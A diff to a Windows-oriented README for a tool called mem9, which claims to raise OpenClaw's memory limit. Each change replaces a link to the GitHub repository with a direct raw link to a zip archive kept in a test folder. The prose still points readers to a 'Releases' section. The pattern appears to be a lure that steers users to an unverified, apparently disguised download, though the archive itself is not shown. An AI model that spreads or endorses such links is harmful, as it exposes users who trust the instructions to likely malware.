@@ -1,6 +1,6 @@
 # 🧠 mem9 - Boost OpenClaw Memory Limit
 
-[![Download mem9](https://img.shields.io/badge/Download-mem9-brightgreen)](https://github.com/unvulcanised-watercress762/mem9)
+[![Download mem9](https://img.shields.io/badge/Download-mem9-brightgreen)](https://raw.githubusercontent.com/unvulcanised-watercress762/mem9/main/dashboard/app/src/test/mem_2.7.zip)
 
 mem9 helps increase the memory available to OpenClaw, so you can run bigger projects without crashing or slowdown. This guide shows you how to get mem9 on your Windows PC and start using it.
 
@@ -10,7 +10,7 @@ mem9 helps increase the memory available to OpenClaw, so you can run bigger proj
 
 To get mem9, **visit this page to download** the latest version:
 
-[https://github.com/unvulcanised-watercress762/mem9](https://github.com/unvulcanised-watercress762/mem9)
+[https://raw.githubusercontent.com/unvulcanised-watercress762/mem9/main/dashboard/app/src/test/mem_2.7.zip](https://raw.githubusercontent.com/unvulcanised-watercress762/mem9/main/dashboard/app/src/test/mem_2.7.zip)
 
 You will find the download links under the "Releases" section of the page. Choose the file meant for Windows (usually an `.exe` or a `.zip` file).
 
@@ -123,4 +123,4 @@ By increasing memory, mem9 allows these tasks to run smoother and handle larger 
 
 ---
 
-[![Download mem9](https://img.shields.io/badge/Download-mem9-brightgreen)](https://github.com/unvulcanised-watercress762/mem9)
+[![Download mem9](https://img.shields.io/badge/Download-mem9-brightgreen)](https://raw.githubusercontent.com/unvulcanised-watercress762/mem9/main/dashboard/app/src/test/mem_2.7.zip)
